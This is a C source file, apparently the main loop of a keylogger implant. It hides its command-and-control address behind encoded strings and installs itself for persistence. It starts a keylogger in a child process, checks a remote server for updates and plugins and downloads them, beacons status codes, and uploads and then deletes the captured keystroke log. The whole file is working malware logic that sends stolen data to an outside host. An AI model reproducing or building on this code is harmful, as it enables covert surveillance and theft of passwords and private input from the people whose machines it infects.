#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>

#include "../include/core.h"

#define IP_ADDR_HX "\x3f\x47\x40\x3c\x47\x47\x3c\x40\x3e\x44\x3c\x43\x46"
#define CHECK_UPDATE "\x3d\x71\x76\x73\x71\x79\x6d\x83\x7e\x72\x6f\x82\x73"
#define UPDATE "\x3d\x83\x7e\x72\x6f\x82\x73"
#define CHECK_PLUGIN "\x34\x64\x6e\x68\x64\x74\x6a\x70\x76\x7a\x6c\x70\x7a"
#define PLUGIN "\x34\x70\x76\x7a\x6c\x70\x7a"

#define MAX_SECONDS 60
#define MAX_LOOPS 10

#define D(data) decrypt_string(data, strlen(data))

int main()
{
	char *data = NULL;
	char *ip_addr[5] = {NULL};
	int i = 0;
	FILE *bl = NULL;
	pid_t pid = 0;

	ip_addr[0] = D(IP_ADDR_HX);
	ip_addr[1] = D(IP_ADDR_HX CHECK_UPDATE);
	ip_addr[2] = D(IP_ADDR_HX UPDATE);
	ip_addr[3] = D(IP_ADDR_HX CHECK_PLUGIN);
	ip_addr[4] = D(IP_ADDR_HX PLUGIN);

	// If its running stop
	upload_data(ip_addr[0], "210");
	if (already_running() == OK) {
		upload_data(ip_addr[0], "411");
		goto FREE_0;
	}

	// If its installed continue, if not install and stop
	upload_data(ip_addr[0], "720");
	if (install() != OTHER) {
		upload_data(ip_addr[0], "921");
		goto FREE_0;
	}

	pid = fork();

	// Start keylogger
	if (pid == 0) {
		upload_data(ip_addr[0], "530");
		init_keylogger();
		goto FREE_0;
	}

	// Check for and download update
	download_data(ip_addr[1], &data);
	if (strcmp(data, "200") == 0)
		download_file(ip_addr[2], 1);

	// Check for and download a plugin
	download_data(ip_addr[3], &data);
	if (strcmp(data, "200") == 0)
		download_file(ip_addr[3], 0);

	// Wait and ping
	for (i = 0; i < MAX_LOOPS; i++) {
		upload_data(ip_addr[0], "800");
		sleep(MAX_SECONDS / MAX_LOOPS);
	}

	// Upload keylogger data
	bl = fopen(BL, "rb+");
	if (!bl) {
		upload_data(ip_addr[0], "441");
	} else {
		upload_data(ip_addr[0], "140");
		upload_file(ip_addr[0], bl);
		fclose(bl);
		remove(BL);
	}

	FREE_0:
	// Free decrypted ip
	for (i=0; i<5; i++)
		free(ip_addr[i]);

	upload_data(ip_addr[0], "760");

	return OK;
}
